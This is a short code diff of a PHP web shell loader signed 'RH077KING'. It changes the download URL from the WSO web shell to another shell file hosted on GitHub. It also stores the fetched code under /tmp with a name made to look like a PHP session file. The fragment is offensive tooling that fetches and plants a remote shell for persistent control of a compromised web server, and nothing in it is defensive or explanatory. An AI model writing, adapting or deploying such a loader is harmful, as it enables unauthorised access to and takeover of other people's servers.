@@ -1,5 +1,5 @@
 <?php #tmp shell by RH077KING
-$URL = 'https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso.php'; #admin
+$URL = 'https://raw.githubusercontent.com/Rh077king/Shell/main/cks.php'; #admin
 $TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';
 
 function M() {
